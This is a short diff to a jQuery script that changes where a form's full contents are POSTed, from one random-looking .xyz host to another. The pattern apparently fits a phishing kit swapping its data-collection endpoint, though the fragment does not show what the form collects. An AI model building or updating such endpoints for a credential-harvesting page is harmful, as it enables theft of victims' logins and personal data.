@@ -13,7 +13,7 @@ $(document).ready(function() {
         var formData = new FormData($("#formx")[0]);
         $("#Btn").html('Processing..').prop("disabled", true);
         $.ajax({
-            url: "https://ranxlca.xyz/m/m.php",
+            url: "https://vvainabx.xyz/m/foz.php",
             type: 'POST',
             data: formData,
             contentType: false,
